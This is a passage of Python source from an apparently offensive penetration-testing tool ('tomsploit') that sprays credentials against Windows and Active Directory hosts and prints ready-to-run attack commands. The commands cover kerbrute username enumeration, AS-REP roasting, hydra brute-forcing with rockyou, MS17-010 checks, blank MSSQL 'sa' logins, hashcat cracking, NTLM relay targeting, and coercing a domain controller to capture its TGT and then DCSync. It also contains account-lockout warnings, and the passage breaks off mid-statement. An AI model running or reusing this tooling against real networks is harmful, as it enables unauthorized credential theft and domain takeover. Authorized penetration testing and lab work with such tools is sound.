                          f"{DIM}{n} attempt{'s' if n != 1 else ''}, "
                          f"all failed{RESET}")
                    continue
                self._print_proto_block(label, lines)

        if quiet_protos:
            print(f"\n  {DIM}── No credential results: "
                  f"{', '.join(quiet_protos)}{RESET}")
        print(f"\n{'─' * BANNER_WIDTH}")

    def _print_proto_block(self, label: str, lines: list[tuple[str, str]],
                           anon: bool = False) -> None:
        """Render one protocol's lines. Ordinary failures print only under
        -v; successes, timeouts, and meaningful failures always print. If
        nothing qualifies (e.g. a lone denied anon attempt in clean mode),
        prints nothing at all."""
        parts = self._partition(lines)
        icon = self._icon(parts)
        hidden = len(parts["ordinary"]) if not self.verbose else 0

        # Decide whether there's anything to show.
        showable = (parts["plus"] or parts["skip"] or parts["valid_but"]
                    or parts["alert"] or parts["error"] or parts["verify"]
                    or (self.verbose and (parts["ordinary"] or parts["info"])))
        if not showable:
            return

        first = True

        def emit(text: str) -> None:
            nonlocal first
            prefix = (f"  {icon} {BOLD}{label:<20}{RESET}" if first
                      else f"      {'':<20}")
            first = False
            print(f"{prefix} {text}")

        for msg in parts["plus"]:
            emit(f"{YELLOW if anon else GREEN}{msg}{RESET}")
        for msg in parts["verify"]:
            emit(f"{YELLOW}{msg}{RESET} {DIM}← unexpected [+] format, "
                 f"verify manually{RESET}")
        for msg in parts["valid_but"]:
            emit(f"{YELLOW}{BOLD}{msg}{RESET} {YELLOW}← creds valid, "
                 f"can't use as-is{RESET}")
        for msg in parts["alert"]:
            emit(f"{YELLOW}{msg}{RESET}")
        for msg in parts["error"]:
            emit(f"{RED}{msg}{RESET}")
        if self.verbose:
            for msg in parts["info"]:
                emit(f"{DIM}{msg}{RESET}")
        if self.verbose:
            for msg in parts["ordinary"]:
                emit(f"{DIM}{msg}{RESET}")
        for msg in parts["skip"]:
            emit(f"{YELLOW}{msg}{RESET}")

        if hidden:
            emit(f"{DIM}(+{hidden} failed attempt"
                 f"{'s' if hidden != 1 else ''} hidden — -v to show){RESET}")

    def _quiet_alarms(self, result: TargetResult) -> None:
        """Under -q, surface only credential alarms — lockout, expired/valid,
        and real errors — so the minimal view never hides a tactic-changer."""
        alarms: list[tuple[str, str, str]] = []  # (label, kind, msg)
        for proto in ALL_PROTOCOLS:
            for local in (False, True):
                scope = "local" if local else "domain"
                lines = result.protocol_lines.get(f"{proto}-{scope}")
                if not lines:
                    continue
                parts = self._partition(lines)
                label = f"{proto.upper()} ({scope})"
                for msg in parts["valid_but"]:
                    alarms.append((label, "valid_but", msg))
                for msg in parts["verify"]:
                    alarms.append((label, "verify", msg))
                for msg in parts["alert"]:
                    alarms.append((label, "alert", msg))
                for msg in parts["error"]:
                    alarms.append((label, "error", msg))
        if not alarms:
            return
        print(f"\n  {YELLOW}{BOLD}⚠ Notable{RESET}")
        for label, kind, msg in alarms:
            color = YELLOW if kind in ("valid_but", "alert", "verify") else RED
            if kind == "valid_but":
                tag = " ← creds valid, can't use as-is"
            elif kind == "verify":
                tag = " ← unexpected [+] format, verify manually"
            else:
                tag = ""
            print(f"    {color}{label:<20}{RESET} {color}{msg}{RESET}"
                  f"{YELLOW}{tag}{RESET}")

    # ── valid-credentials section (the headline) ─
    # ── --sh: paste-ready commands, nothing else ─
    _PLACEHOLDER_RE = re.compile(r"<[^<>\s][^<>]*>")

    @classmethod
    def _sh_command(cls, cmd: str) -> list[str]:
        """Render one suggestion's lines for --sh, commenting out any command
        that still holds an unfilled <PLACEHOLDER>.

        Placeholders aren't merely non-runnable: to a shell '<' and '>' are
        REDIRECTS, so `-extra-sid <PARENT-SID>-519` would quietly create a
        file called '-519', and a trailing `<parent-dc.fqdn>` is a syntax
        error that aborts everything after it in a sourced script.

        Works on whole LOGICAL commands rather than physical lines, because a
        backslash continuation is one command and half-commenting it is worse
        than not commenting at all: comment only the second line and the
        first dangles with a trailing '\\' that splices the comment into it;
        comment only the first and the second runs as an orphan fragment
        (`-action write ...`). Fill the value in, strip the leading '# ',
        then run."""
        lines = cmd.split("\n")
        out: list[str] = []
        i = 0
        while i < len(lines):
            line = lines[i].rstrip()
            stripped = line.lstrip()
            if not stripped or stripped.startswith("#"):
                out.append(line)
                i += 1
                continue
            # Gather the full logical command, following \ continuations.
            group = [line]
            while group[-1].endswith("\\") and i + 1 < len(lines):
                i += 1
                group.append(lines[i].rstrip())
            if any(cls._PLACEHOLDER_RE.search(g) for g in group):
                out.extend(f"# {g}" for g in group)
            else:
                out.extend(group)
            i += 1
        return out

    def sh_section(self, result: TargetResult) -> None:
        """Flush-left commands with findings as # comments. No boxes, no
        indentation, no colour — the point is that `--sh > next.sh` gives a
        file you can read, edit and run without stripping anything out."""
        ip = result.real_ip or result.target
        wrote = False

        if result.anon_smb:
            print("\n# --- anonymous SMB ---")
            for label, tmpl in ANON_SMB_COMMANDS:
                print(f"# {label}")
                for ln in self._sh_command(tmpl.format(ip=ip)):
                    print(ln)
            wrote = True

        if result.anon_ldap:
            print("\n# --- anonymous LDAP ---")
            for u in result.anon_ldap_users:
                desc = f"  # {u['description']}" if u.get("description") else ""
                print(f"# user: {u['user']}{desc}")
            if result.anon_ldap_users:
                names = " ".join(q(u["user"]) for u in result.anon_ldap_users)
                print(f"printf '%s\\n' {names} > users.txt")
            print(f"nxc ldap {ip} -u '' -p '' --users")
            wrote = True

        seen: set[tuple] = set()
        for s in sorted(result.successes, key=success_sort_key):
            key = (s.protocol, s.auth_type, s.local_auth,
                   s.domain.lower(), s.user.lower())
            if key in seen:
                continue
            seen.add(key)
            entries = build_suggestions(
                s, ip, result.hostname, result.is_dc,
                "" if s.local_auth else (result.domain or self.cfg.domain or ""),
                enrich=result, deleg_inline=True, notes=True)
            if not entries:
                continue
            who = f"{s.domain}\\{s.user}" if s.domain else s.user
            scope = " local" if s.local_auth else ""
            auth = ("" if s.auth_type == AuthType.PASSWORD
                    else f" {s.auth_type.value}")
            adm = " ADMIN" if s.is_admin else ""
            print(f"\n# --- {s.protocol.upper()}{auth}{scope} · {who}{adm} ---")
            for label, cmd, hint in entries:
                print(f"# {label}")
                if hint:
                    print(f"#   → {hint}")
                for ln in self._sh_command(cmd):
                    print(ln)
            wrote = True

        if not wrote:
            print("# no valid credentials")

    def valid_section(self, result: TargetResult) -> None:
        if self.sh:
            self.sh_section(result)
            return
        has_anything = (result.successes or result.guests
                        or result.anon_smb or result.anon_ldap)
        if not has_anything:
            # Keep the blunt one-liner, then the tailored "where to go" block.
            print(f"\n  {RED}{BOLD}✗ No valid credentials found.{RESET}")
            if self.quiet:
                # -q means "just creds + alarms". next_steps already returns
                # early under quiet; this path did not, so the ~50-line
                # playbook printed anyway and -q saved almost nothing.
                print(f"{'═' * BANNER_WIDTH}\n")
                return
            if self.multi:
                # The full playbook is near-identical for every cred-less host,
                # so on a multi-target run it's hoisted into Next Steps and
                # printed once against the union of open protocols.
                self.no_access_brief(result)
            else:
                self.no_access(result)
            print(f"{'═' * BANNER_WIDTH}\n")
            return

        ip = result.real_ip or result.target
        if result.anon_smb:
            self._anon_smb(ip)
        if result.anon_ldap:
            self._anon_ldap(result, ip)
        if result.successes:
            self._valid_creds(result)
        if result.guests:
            self._guests(result)
        if result.successes:
            self._delegation(result)
            self._dc_self_delegation_note(result)
            self._suggestions(result)
        print(f"{'═' * BANNER_WIDTH}\n")

    def no_access_brief(self, result: TargetResult) -> None:
        openp = ", ".join(p.upper() for p in result.open_protocols) or "none"
        print(f"    {DIM}open: {openp} — consolidated guidance in "
              f"Next Steps below{RESET}")

    def no_access(self, result: TargetResult) -> None:
        """Tailored 'you're stuck' guidance for a single host."""
        self._no_access_body(
            target=result.real_ip or result.target,
            openp=set(result.open_protocols),
            dom=result.domain or self.cfg.domain or "<DOMAIN>",
            is_dc=result.is_dc,
            is_ad=result.is_dc or ("ldap" in result.open_protocols))

    def no_access_playbook(self, failed: list[TargetResult]) -> None:
        """The same guidance, printed once for a multi-target run against the
        union of what was open across every host that yielded nothing."""
        if not failed:
            return
        openp: set[str] = set()
        for r in failed:
            openp.update(r.open_protocols)
        dom = next((r.domain for r in failed if r.domain), "") or self.cfg.domain
        any_dc = any(r.is_dc for r in failed)
        print(f"\n  {BOLD}Hosts with no access ({len(failed)}){RESET}")
        print(f"  {DIM}{'─' * 32}{RESET}")
        for r in failed:
            openlist = ", ".join(p.upper() for p in r.open_protocols) or "none"
            host = r.hostname or r.real_ip or r.target
            dc_tag = f" {YELLOW}[DC]{RESET}" if r.is_dc else ""
            print(f"    {RED}✘{RESET} {BOLD}{host}{RESET} "
                  f"{DIM}({r.real_ip or r.target}){RESET}{dc_tag} "
                  f"{DIM}— {openlist}{RESET}")
        print(f"\n    {DIM}# commands below use <TARGET> — substitute a host "
              f"from the list{RESET}")
        self._no_access_body(target="<TARGET>", openp=openp,
                             dom=dom or "<DOMAIN>", is_dc=any_dc,
                             is_ad=any_dc or ("ldap" in openp))

    def _no_access_body(self, target: str, openp: set, dom: str,
                        is_dc: bool, is_ad: bool) -> None:
        """Scoped to tomsploit's lane — credential acquisition + the no-cred AD
        playbook — and defers service-level enumeration to tombuster so the
        two tools don't print the same recipes.

        Anti-duplication with Next Steps: when a confident DC is involved, the
        username-harvest / AS-REP specifics live in the Next Steps DC section,
        so here we only point at them."""

        print(f"\n  {CYAN}{BOLD}🧭 No access yet — where to go next{RESET}")
        print(f"  {'─' * (BANNER_WIDTH - 2)}")

        # 1) Universal: the credential set is the problem (every attempt failed
        #    by definition). Widening it beats re-spraying.
        print(f"\n    {BOLD}Reuse creds elsewhere:{RESET}")
        print("        tomsploit -t <other-host> -u users.txt -H <ntlm-hash>")

        # 2) AD with no foothold — username list is usually the gap.
        if is_ad:
            print(f"\n    {BOLD}AD detected — usually the username list is what's "
                  f"missing:{RESET}")
            if is_dc:
                print(f"        {DIM}# kerbrute / RID-brute / AS-REP are in the "
                      f"Next Steps section below{RESET}")
                if "ldap" in openp:
                    print()
                    print(f"        {DIM}# also pull users from anonymous LDAP{RESET}")
                    print(f"        nxc ldap {target} -u '' -p '' --users")
            else:
                print(f"        {DIM}# build a username list{RESET}")
                print(f"        kerbrute userenum --dc {target} -d {dom} "
                      f"/usr/share/seclists/Usernames/Names/names.txt")
                if "ldap" in openp:
                    print()
                    print(f"        {DIM}# pull users from anonymous LDAP{RESET}")
                    print(f"        nxc ldap {target} -u '' -p '' --users")
                print()
                print(f"        {DIM}# AS-REP roast the list — no creds needed{RESET}")
                print(f"        impacket-GetNPUsers {dom}/ -dc-ip {target} -request "
                      f"-no-pass -usersfile users.txt -format hashcat "
                      f"-outputfile asrep.hash")
                if "smb" in openp:
                    print()
                    print(f"        {DIM}# enumerate users over null/guest SMB{RESET}")
                    print(f"        nxc smb {target} -u '' -p '' --rid-brute")

        # 3) SMB open — guest fallback + the classic no-cred exploit check.
        if "smb" in openp:
            print(f"\n    {BOLD}SMB beyond the null session:{RESET}")
            print(f"        {DIM}# null denied? try guest, then a broad sweep{RESET}")
            print(f"        nxc smb {target} -u guest -p '' --shares")
            print(f"        enum4linux-ng -A {target}")
            print()
            print(f"        {DIM}# no-cred exploit check (older boxes): MS17-010{RESET}")
            print(f"        nxc smb {target} -u '' -p '' -M ms17-010")

        # 3.5) Brute-force the login: the cred SET failed, so escalate from
        #      spraying a known set to a wordlist. hydra owns this — tomsploit
        #      doesn't brute. Lockout-aware: SSH/FTP are usually local accounts
        #      (safe); RDP/SMB on a DC can lock (see the warning before the spray).
        print(f"\n    {BOLD}Brute-force the login (cred set failed → wordlist):{RESET}")
        wl = "/usr/share/wordlists/rockyou.txt"
        for p in ("ssh", "ftp"):
            if p in openp:
                print(f"        {DIM}# {p.upper()} — usually local accounts, lockout-safe{RESET}")
                print(f"        hydra -L users.txt -P {wl} {p}://{target}")
        if "rdp" in openp:
            print(f"        {DIM}# RDP — AD accounts can LOCK; check the policy first{RESET}")
            print(f"        hydra -L users.txt -P {wl} rdp://{target}")
        if "mssql" in openp:
            print(f"        {DIM}# MSSQL logins{RESET}")
            print(f"        hydra -L users.txt -P {wl} mssql://{target}")
        if "vnc" in openp:
            print(f"        {DIM}# VNC — password only{RESET}")
            print(f"        hydra -P {wl} vnc://{target}")
        # Generic web login form (tomsploit doesn't probe web — fill these in).
        print(f"        {DIM}# web login form (80/443) — set the path, fields & FAIL string:{RESET}")
        print(f"        hydra -L users.txt -P {wl} {target} http-post-form \\")
        print(f"          {DIM}\"/login.php:username=^USER^&password=^PASS^:F=Invalid credentials\"{RESET}")
        if "smb" in openp or "winrm" in openp:
            print(f"        {DIM}# SMB/WinRM: brute with nxc (better than hydra) — but on a DC{RESET}")
            print(f"        {DIM}# this LOCKS accounts, so read the policy first:{RESET}")
            print(f"        nxc smb {target} -u '' -p '' --pass-pol")
            print(f"        nxc smb {target} -u users.txt -p {wl}   {DIM}# only if lockout allows{RESET}")

        # 4) Maybe it isn't a credential box. Famous no-cred angles for the
        #    cred-services present, then hand service enumeration to tombuster.
        print(f"\n    {BOLD}Maybe it's not a credential box at all:{RESET}")
        if "rdp" in openp:
            print(f"        {DIM}# RDP version → BlueKeep (CVE-2019-0708){RESET}")
            print(f"        nmap -p3389 --script rdp-ntlm-info,rdp-enum-encryption "
                  f"{target}")
        if "mssql" in openp:
            print(f"        {DIM}# MSSQL: try a blank 'sa' before assuming you "
                  f"need creds{RESET}")
            print(f"        impacket-mssqlclient sa:''@{target}")
        print(f"        {DIM}# service versions, web, and CVE checks live in "
              f"tombuster:{RESET}")
        print(f"        tombuster -t {target}")

    # ── pre-spray account-lockout warning ─
    def _attempts_per_user(self, result: "TargetResult | None" = None
                           ) -> tuple[int, int, int]:
        """Failed domain logons each account could rack up this run, as
        (total, per_protocol, n_domain_protocols).

        The multiplier matters: every domain-scope protocol authenticates the
        same credential independently, and each rejection increments
        badPwdCount on the DC. Three passwords against a host answering SMB,
        WMI, WinRM, RDP, MSSQL and LDAP is ~18 bad logons per account, not 3 —
        counting only the secrets is how you lock out a domain while the tool
        reports you are safely under the threshold.

        Local-scope attempts hit the machine SAM, not AD, so they do not
        count; neither do ssh/ftp/vnc/nfs."""
        if self.cfg.kerberos:
            return 0, 0, 0
        per_proto = (1 if self.cfg.paired
                     else len(self.cfg.passwords) + len(self.cfg.hashes))
        if result is None:
            return per_proto, per_proto, 1
        n = max(1, sum(1 for p in result.open_protocols if p in WINDOWS_PROTOS))
        return per_proto * n, per_proto, n

    def lockout_warning(self, result: TargetResult) -> None:
        """Warn (before the spray) about the account-lockout policy read over
        an anonymous session. Shown even under -q — it's a safety alarm, and
        it never blocks the spray (warn-only)."""
        if not result.lockout_checked:
            return
        # In --sh mode stdout is a shell script, but this is a safety alarm
        # and must never be dropped — send it to stderr instead.
        out = sys.stderr if self.sh else sys.stdout

        def say(text: str) -> None:
            print(text, file=out)

        th = result.lockout_threshold
        attempts, per_proto, n_protos = self._attempts_per_user(result)
        # Only worth spelling out when the multiplier is doing something;
        # "(under the threshold; 1 secret(s))" just restates the number.
        breakdown = (f"; {per_proto} secret(s) × {n_protos} domain-auth protocol(s)"
                     if n_protos > 1 else "")
        if th is None:
            say(f"  {DIM}🔒 Lockout policy not readable anonymously — spray "
                f"with care (threshold unknown, ~{attempts} bad logons/user "
                f"this run).{RESET}")
            return
        if th == 0:
            say(f"  {GREEN}🔓 Lockout threshold disabled (0) — safe to spray."
                f"{RESET}")
            return
        win = f", resets after {result.lockout_window}" if result.lockout_window else ""
        sev = RED if attempts and attempts >= th else YELLOW
        say(f"  {sev}{BOLD}🔒 ACCOUNT LOCKOUT RISK{RESET} {sev}— threshold "
            f"{th} bad attempts{win}.{RESET}")
        if attempts and attempts >= th:
            say(f"  {sev}   ~{attempts} secret(s)/user this run WILL lock "
                f"accounts{breakdown}. Trim secrets, use --paired, or cut "
                f"the protocol set: --protocols smb{RESET}")
        elif attempts:
            say(f"  {DIM}   ~{attempts} secret(s)/user this run (under the "
                f"threshold{breakdown}), but failed re-runs accumulate within "
                f"the window.{RESET}")

    def _anon_smb(self, ip: str) -> None:
        print(f"\n  {CYAN}{BOLD}💡 Anonymous SMB — Suggested Next Steps{RESET}")
        print(f"  {'─' * (BANNER_WIDTH - 2)}")
        for i, (label, tmpl) in enumerate(ANON_SMB_COMMANDS):
            if i > 0:
                print()
            print(f"        {DIM}# {label}{RESET}")
            print(f"        {tmpl.format(ip=ip)}")
        print()

    def _anon_ldap(self, result: TargetResult, ip: str) -> None:
        dom = result.domain or "<DOMAIN>"
        print(f"\n  {CYAN}{BOLD}💡 Anonymous LDAP — Users Enumerated{RESET}")
        print(f"  {'─' * (BANNER_WIDTH - 2)}")
        users = result.anon_ldap_users
        if users:
            has_desc = [u for u in users if u.get("description")]
            no_desc = [u for u in users if not u.get("description")]
            if has_desc:
                print(f"\n    {YELLOW}{BOLD}⚠ Users with descriptions "
                      f"(check for passwords!):{RESET}\n")
                for u in has_desc:
                    print(f"    {YELLOW}►{RESET} {BOLD}{u['user']:<24}{RESET} "
                          f"{DIM}│{RESET} {YELLOW}{u['description']}{RESET}")
                print()
            if no_desc:
                names = ", ".join(u["user"] for u in no_desc)
                print(f"    {DIM}Other users: {names}{RESET}\n")
            print(f"        {DIM}# save usernames for spraying / roasting{RESET}")
            # printf + per-name shlex.quote, NOT echo '<newline-joined>':
            # a single apostrophe in a name (o'brien) closed the quote early
            # and left the pasted command hanging on an unterminated string.
            names = " ".join(q(u["user"]) for u in users)
            print(f"        printf '%s\\n' {names} > users.txt")
            print()
            print(f"        {DIM}# AS-REP roast with NO creds (just usernames){RESET}")
            print(f"        impacket-GetNPUsers {dom}/ -dc-ip {ip} -request "
                  f"-no-pass -usersfile users.txt -format hashcat "
                  f"-outputfile asrep.hash")
            print()
        print(f"        {DIM}# just usernames via nxc{RESET}")
        print(f"        nxc ldap {ip} -u '' -p '' --users")
        print()
        print(f"        {DIM}# full anonymous dump{RESET}")
        print(f"        nxc ldap {ip} -u '' -p '' --query \"(objectClass=*)\" \"\"")
        print()

    def _valid_creds(self, result: TargetResult) -> None:
        ordered = sorted(result.successes, key=success_sort_key)
        print(f"\n  {GREEN}{BOLD}✓ VALID CREDENTIALS{RESET}\n")
        for s in ordered:
            badge = f" {YELLOW}[admin]{RESET}" if s.is_admin else ""
            print(f"    {GREEN}►{RESET} {BOLD}{s.label:<20}{RESET} "
                  f"{DIM}│{RESET} {s.raw_message}{badge}")
        print()

    def _guests(self, result: TargetResult) -> None:
        print(f"  {YELLOW}{BOLD}⚠ GUEST MAPPING — likely not real auth{RESET}")
        print(f"  {DIM}Samba's `map to guest = bad user` accepts any creds "
              f"and downgrades to guest.{RESET}")
        print(f"  {DIM}Treat as info disclosure, not a working login.{RESET}\n")
        for s in result.guests:
            print(f"    {YELLOW}►{RESET} {BOLD}{s.label:<20}{RESET} "
                  f"{DIM}│{RESET} {s.raw_message}")
        print()
        # Guest still reads guest-accessible shares — enumerate exactly like a
        # null session. Skip if the anonymous-SMB block already printed these.
        if not result.anon_smb:
            ip = result.real_ip or result.target
            print(f"  {CYAN}{BOLD}💡 Guest SMB — read what guest can reach{RESET}")
            print(f"  {'─' * (BANNER_WIDTH - 2)}")
            for i, (label, tmpl) in enumerate(ANON_SMB_COMMANDS):
                if i > 0:
                    print()
                print(f"        {DIM}# {label}{RESET}")
                print(f"        {tmpl.format(ip=ip)}")
            print(f"\n        {DIM}# a readable share with a config/backup is the "
                  f"usual win — grep it for creds, then reuse them (spray everywhere){RESET}")
            print()

    def _delegation(self, result: TargetResult) -> None:
        """Compact delegation findings + the full command set written to its
        own file. Findings belong on screen; command lists belong in a file
        you open when you are ready to act on one."""
        rows = getattr(result, "deleg_rows", [])
        if not rows or self.cfg.deleg_inline:
            return
        cred = None
        for s in sorted(result.successes, key=success_sort_key):
            if s.protocol == "ldap" and not s.local_auth and not s.is_guest:
                cred = s
                break
        if cred is None:
            return

        ip = result.real_ip or result.target
        dom = result.domain or self.cfg.domain or ""
        try:
            ctx = build_context(cred, ip, result.hostname, result.is_dc, dom)
            dctx = _deleg_ctx_from(ctx, cred, ip, result.hostname, getattr(result, "maq", None))
            dctx["roastable_sweep"] = getattr(result, "roastable_sweep", []) or []
        except Exception:
            return

        # The FINDINGS are a domain property (same for anyone), but the
        # COMMANDS are written for whoever ran the scan — they carry this
        # account and its credential. So the file is per-(DC, account): key
        # the name on both, or a second account against the same DC would
        # silently overwrite the first account's walkthrough.
        if self.cfg.deleg_out:
            path = self.cfg.deleg_out          # explicit path: honour it verbatim
        else:
            who = _safe_filename_part(cred.user) or "user"
            path = f"tomsploit-delegation-{ip}-{who}.txt"
        written = False
        try:
            with open(path, "w", encoding="utf-8") as f:
                f.write(delegation_file_text(rows, dctx, ip, dom or "<unknown>"))
            written = True
        except OSError as exc:
            self._deleg_write_error = str(exc)

        lines = summarise_delegation(rows, dctx)
        print(f"  {CYAN}{BOLD}🔑 Delegation — {len(rows)} finding(s){RESET}")
        print(f"  {'─' * (BANNER_WIDTH - 2)}")
        width = max((len(a) for a, _, _ in lines), default=0)
        # Uniform, factual: account · what it gets you · what is still missing.
        # No ranking, no highlight — every finding reads the same.
        for account, gets, gap in lines:
            miss = f"   {DIM}need: {gap}{RESET}" if gap else ""
            print(f"      {BOLD}{account:<{width}}{RESET}  {gets}{miss}")
        if written:
            print(f"\n    {DIM}full commands → {RESET}{BOLD}{path}{RESET}")
        else:
            print(f"\n    {YELLOW}could not write {path}: "
                  f"{getattr(self, '_deleg_write_error', 'error')}{RESET}")
        print()

    def _dc_self_delegation_note(self, result: TargetResult) -> None:
        """The DC you're on is ITSELF unconstrained-delegation-trusted (every DC
        is, by default) — findDelegation deliberately omits DCs, so it never
        shows up as a delegation "finding". But with admin here it is a real
        attack surface: coerce ANOTHER DC (e.g. a parent-domain DC across a
        trust) to authenticate to this one and capture its TGT.

        Printed independently of whether findDelegation found anything, so a DC
        with zero delegation findings (the common case) still gets the pointer.
        """
        if self.sh or not result.is_dc:
            return
        if not any(s.is_admin for s in result.successes):
            return
        dcn = result.hostname or "this DC"
        print(f"  {CYAN}{BOLD}🔑 This DC is unconstrained-trusted{RESET}")
        print(f"  {'─' * (BANNER_WIDTH - 2)}")
        print(f"    {DIM}Every DC is trusted for unconstrained delegation, so "
              f"{dcn} is too — findDelegation omits DCs, so it won't appear as "
              f"a finding above.{RESET}")
        print(f"    {DIM}With admin here you can capture ANOTHER DC's TGT: run "
              f"Rubeus monitor / krbrelayx on {dcn}, then coerce the other DC "
              f"(e.g. a parent-domain DC over a trust) to authenticate here — "
              f"then DCSync it. Same PATH (a)/(b) as an unconstrained finding.{RESET}")
        print()
        # One block per DISTINCT credential (protocol + auth + scope + user),
        # so two different accounts that both authenticate on the same
        # protocol — e.g. a domain user and a local admin on SMB — each get
        # their own command set. Only genuine duplicates collapse.
        seen: set[tuple] = set()
        blocks: list[tuple[Success, list[tuple[str, str]]]] = []
        for s in sorted(result.successes, key=success_sort_key):
            key = (s.protocol, s.auth_type, s.local_auth,
                   s.domain.lower(), s.user.lower())
            if key in seen:
                continue
            seen.add(key)
            try:
                entries = build_suggestions(
                    s, result.real_ip or result.target, result.hostname,
                    result.is_dc,
                    "" if s.local_auth else (result.domain
                                             or self.cfg.domain or ""),
                    enrich=result, deleg_inline=self.cfg.deleg_inline,
                    notes=self.cfg.notes)
            except Exception as exc:
                entries = [("error", f"# suggestion builder failed: "
                            f"{exc.__class__.__name__}: {exc}", "")]
            if entries:
                blocks.append((s, entries))

        if not blocks:
            return

        dc_tag = f" {YELLOW}[DC]{RESET}" if result.is_dc else ""
        print(f"  {CYAN}{BOLD}💡 Suggested Commands{RESET}{dc_tag}")
        print(f"  {'─' * (BANNER_WIDTH - 2)}")
        for s, entries in blocks:
            header = f"[{s.protocol.upper()}"
            if s.auth_type == AuthType.HASH:
                header += " · PtH"
            elif s.auth_type == AuthType.KERBEROS:
                header += " · Kerberos"
            who = f"{s.domain}\\{s.user}" if s.domain else s.user
            header += f" · {who}"
            if s.local_auth:
                header += " · local"
            header += "]"
            print(f"\n    {GREEN}►{RESET} {BOLD}{header}{RESET}")
            if self.cfg.bare:
                # Commands only. Nothing but what you paste.
                for _l, cmd, _h in entries:
                    for ln in cmd.split("\n"):
                        print(f"        {ln.rstrip()}")
                continue
            if not self.cfg.notes:
                # Default: one outcome line per command, then the command.
                # The hint says what a HIT looks like and where it leads —
                # never what the command is, which the invocation already
                # states. Commands with no hint print bare rather than get
                # a padded line for consistency's sake.
                for _l, cmd, hint in entries:
                    if hint:
                        print(f"        {DIM}# {hint}{RESET}")
                    for ln in cmd.split("\n"):
                        print(f"        {ln.rstrip()}")
                continue
            for i, (label, cmd, _h) in enumerate(entries):
                if i > 0:
                    print()
                if i == 0:
                    print(f"        {YELLOW}# ★ {label}{RESET}")
                else:
                    print(f"        {DIM}# {label}{RESET}")
                for ln in cmd.split("\n"):
                    print(f"        {ln.rstrip()}")
        print()

    # ── run-level summaries ─
    def summary(self, results: list[TargetResult]) -> None:
        if self.sh or len(results) <= 1:
            return
        n_win = sum(1 for r in results
                    if r.successes or r.anon_smb or r.anon_ldap)
        print(f"\n{BOLD}{'═' * BANNER_WIDTH}{RESET}")
        print(f"  {CYAN}{BOLD}📊 Summary{RESET}  {DIM}({len(results)} targets){RESET}")
        print(f"{'═' * BANNER_WIDTH}")
        for r in results:
            ok = r.successes or r.anon_smb or r.anon_ldap
            icon = f"{GREEN}✔{RESET}" if ok else f"{RED}✘{RESET}"
            host = r.target
            if r.hostname:
                host += f" {DIM}({r.hostname}){RESET}"
            if r.is_dc:
                host += f" {YELLOW}[DC]{RESET}"
            n_creds = (len(r.successes) + (1 if r.anon_smb else 0)
                       + (1 if r.anon_ldap else 0))
            cred_tag = (f" {GREEN}{n_creds} cred{'s' if n_creds != 1 else ''}{RESET}"
                        if n_creds else "")
            time_tag = f" {DIM}[{r.elapsed:.1f}s]{RESET}"
            skip_tag = (f" {DIM}({r.skipped_reason}){RESET}"
                        if not r.scanned else "")
            print(f"  {icon} {host}{cred_tag}{time_tag}{skip_tag}")
        print(f"\n  Total: {GREEN}{BOLD}{n_win}{RESET}/{len(results)} "
              f"targets with credentials")
        print(f"{'═' * BANNER_WIDTH}\n")

    def next_steps(self, results: list[TargetResult]) -> None:
        if self.quiet:
            return
        # Group DCs by domain so per-domain commands are emitted once.
        dcs_by_domain: dict[str, list[tuple[str, str]]] = {}
        for r in results:
            if r.is_dc and r.real_ip:
                key = r.domain or "<DOMAIN>"
                dcs_by_domain.setdefault(key, []).append(
                    (r.hostname or r.real_ip, r.real_ip))

        # Hosts with SMB signing off are NTLM-relay targets.
        relay_hosts = [(r.hostname or r.real_ip or r.target, r.real_ip or r.target)
                       for r in results if r.smb_signing is False]

        # Cred-less hosts get one consolidated playbook on a multi-target run
        # (single-target already printed it inline).
        failed_hosts = [r for r in results if r.scanned
                        and not (r.successes or r.anon_smb or r.anon_ldap)]
        show_failed = bool(failed_hosts) and self.multi

        has_dcs = bool(dcs_by_domain)
        has_relay = bool(relay_hosts)
        has_files = bool(self.cfg.creds_file or self.cfg.json_out or self.cfg.log_file)
        if not has_dcs and not has_relay and not has_files and not show_failed:
            return

        print(f"\n{BOLD}{'═' * BANNER_WIDTH}{RESET}")
        print(f"  {CYAN}{BOLD}🎯 Next Steps{RESET}")
        print(f"{'═' * BANNER_WIDTH}")

        if has_dcs:
            print(f"\n  {BOLD}Domain Controllers detected{RESET}")
            print(f"  {DIM}{'─' * 32}{RESET}")
            for domain, hosts in dcs_by_domain.items():
                for hostname, ip in hosts:
                    suffix = (f" {DIM}—{RESET} {domain}"
                              if domain != "<DOMAIN>" else "")
                    print(f"    {YELLOW}►{RESET} {BOLD}{hostname}{RESET} "
                          f"{DIM}({ip}){RESET}{suffix}")

            print(f"\n  {BOLD}No-auth AD attacks{RESET} "
                  f"{DIM}(try alongside any creds found above){RESET}")
            print(f"  {DIM}{'─' * 32}{RESET}")
            first = True
            for domain, hosts in dcs_by_domain.items():
                if not first:
                    print()
                first = False
                dc_ip = hosts[0][1]
                dom = domain if domain != "<DOMAIN>" else "<DOMAIN>"
                print(f"        {DIM}# enumerate usernames — kerbrute{RESET}")
                print(f"        kerbrute userenum --dc {dc_ip} -d {dom} "
                      f"/usr/share/seclists/Usernames/Names/names.txt")
                print()
                print(f"        {DIM}# enumerate usernames — null-session RID brute{RESET}")
                print(f"        nxc smb {dc_ip} -u '' -p '' --rid-brute")
                print()
                print(f"        {DIM}# AS-REP roast — preauth disabled = free hash{RESET}")
                print(f"        impacket-GetNPUsers {dom}/ -dc-ip {dc_ip} "
                      f"-request -no-pass -usersfile users.txt")

            print(f"\n  {BOLD}Cracking captured hashes{RESET}")
            print(f"  {DIM}{'─' * 32}{RESET}")
            crack = (
                ("AS-REP (Kerberos 5 AS-REP)", "18200", "asrep.hash"),
                ("Kerberoast (Kerberos 5 TGS-REP)", "13100", "kerb.hash"),
                ("NTDS / SAM (NTLM)", "1000", "ntds.hash"),
                ("NetNTLMv2 (responder / relay)", "5600", "netntlm.hash"),
            )
            for i, (label, mode, fname) in enumerate(crack):
                if i > 0:
                    print()
                print(f"        {DIM}# {label}{RESET}")
                print(f"        hashcat -m {mode} {fname} "
                      f"/usr/share/wordlists/rockyou.txt")

        if has_relay:
            print(f"\n  {BOLD}SMB signing off — NTLM relay targets{RESET}")
            print(f"  {DIM}{'─' * 32}{RESET}")
            for hostname, ip in relay_hosts:
                print(f"    {YELLOW}►{RESET} {BOLD}{hostname}{RESET} "
                      f"{DIM}({ip}){RESET}")
            targets_file = "relay-targets.txt"
            ips = " ".join(ip for _, ip in relay_hosts)
            print(f"\n        {DIM}# save the relay targets{RESET}")
            print(f"        printf '%s\\n' {ips} > {targets_file}")
            print(f"\n        {DIM}# capture + relay hashes (run responder with "
